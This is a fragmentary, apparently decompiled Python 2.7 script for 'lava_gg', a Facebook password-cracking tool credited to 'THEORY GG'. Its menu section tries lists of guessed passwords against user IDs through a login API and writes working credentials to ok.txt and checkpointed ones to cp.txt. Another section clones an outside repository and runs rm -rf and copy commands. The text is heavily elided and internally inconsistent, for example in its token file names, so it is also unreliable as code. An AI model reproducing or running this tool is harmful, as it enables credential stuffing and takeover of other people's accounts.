...
# File: As THEORY_GG.py (Python 2.7)
#ALL CREDIT BY M THEORY GG
...
###############################\n    # TOOL NAME: { lava_gg }      #\n    # AUTHOR   : THEORY GG        #\n    # GITHUB   : https://github.com/theorygg/lavagg     #\n    ####!!!!####......................####!!!!#####" | lolcat -a -d 2 -s 50')
...
def main():
    ...
    print '\x1b[96;1m  [J]  THEORY GG GROUP \x1b[92;1m\xe2\x9c\x98\x1b[91;1m\xe2\x9c\x98'
...
def log_sel():
    ...
    if sel == '':
        ...
        subprocess.check_output([
            'am',
            'start',
            'https://www.facebook.com/attaullah.wardag.5'])
        main()
    elif sel == '3' or sel == '03':
        import os
        
        try:
            os.system('git clone https://github.com/Haroon302/PMIK_lover')
            os.system('rm -rf PMIK_lover.py')
            os.system('cp -f theory_gg/theory_gg.py \\.')
            os.system('rm -rf theory_gg')
...
def token_check():
    ...
    try:
        token = open('theory_gg_token.txt', 'r').read()
    except IOError:
        print '\x1b[91;1m[!] TOKEN INVALID'
        os.system('rm -rf theory_gg_token.txt')
...
def menu():
    ...
    try:
        token = open('PMIK_lover_token.txt', 'r').read()
    except (KeyError, IOError):
        token()
                        ...
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            ...
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                ...
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    ...
                                    data = requests.get(api, params = params, headers = headers_)
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        print ' \x1b[1;32m[GG-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in data.json()['error_msg']:
                                        print ' \x1b[1;33m[GG-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32mGG-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[GG-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass8 + '\n')
                                            cp.close()
...
def crack_select():
    ...
    linex()
    print ''
    raw_input('\x1b[93;1m PRESS ENTER TO BACK INFO BY THEORY GG ')
    menu()
